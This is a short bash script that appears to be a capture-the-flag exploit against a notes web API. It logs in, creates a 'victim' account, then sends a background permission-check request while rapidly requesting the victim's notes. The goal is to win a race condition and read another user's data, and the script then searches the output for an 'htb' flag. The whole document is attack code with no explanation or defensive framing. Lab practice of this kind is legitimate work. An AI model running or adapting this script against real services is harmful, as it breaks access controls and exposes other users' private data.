#!/bin/bash

BASE_URL="http://83.136.255.203:47148"
TOKEN=$(curl -s -X POST $BASE_URL/api/auth/login -H "Content-Type: application/json" -d '{"email":"test@test.com","password":"test123"}' | jq -r .token)

echo "[*] Token: $TOKEN"

# My note
MY_NOTE="9d7f934b-8e5a-467c-a256-15fa10ca6765"

# Create victim user
VICTIM_EMAIL="victim$(date +%N)@test.com"
VICTIM_TOKEN=$(curl -s -X POST $BASE_URL/api/auth/register -H "Content-Type: application/json" -d "{\"email\":\"$VICTIM_EMAIL\",\"password\":\"test123\"}" | jq -r .token)
VICTIM_NOTES=$(curl -s -X GET $BASE_URL/api/notes -H "Authorization: Bearer $VICTIM_TOKEN" | jq -r '.notes[].id')

echo "[*] Victim notes: $VICTIM_NOTES"

# Try to exploit timing: call check-permission then immediately try victim notes
for VICTIM_NOTE in $VICTIM_NOTES; do
    echo "[*] Trying victim note: $VICTIM_NOTE"
    
    # Call check-permission in background
    curl -s -X GET "$BASE_URL/api/notes/$MY_NOTE/check-permission" -H "Authorization: Bearer $TOKEN" > /dev/null &
    
    # Immediately try to access victim note (multiple times rapidly)
    for i in {1..20}; do
        RESULT=$(curl -s -X GET "$BASE_URL/api/notes/$VICTIM_NOTE" -H "Authorization: Bearer $TOKEN")
        if echo "$RESULT" | grep -q '"success":true'; then
            echo "[!!!] SUCCESS! Found: $RESULT"
            if echo "$RESULT" | grep -qi "htb"; then
                echo "[!!!] FLAG FOUND: $RESULT"
            fi
        fi
    done
    
    wait
    sleep 0.2
done

echo "[*] Test complete"
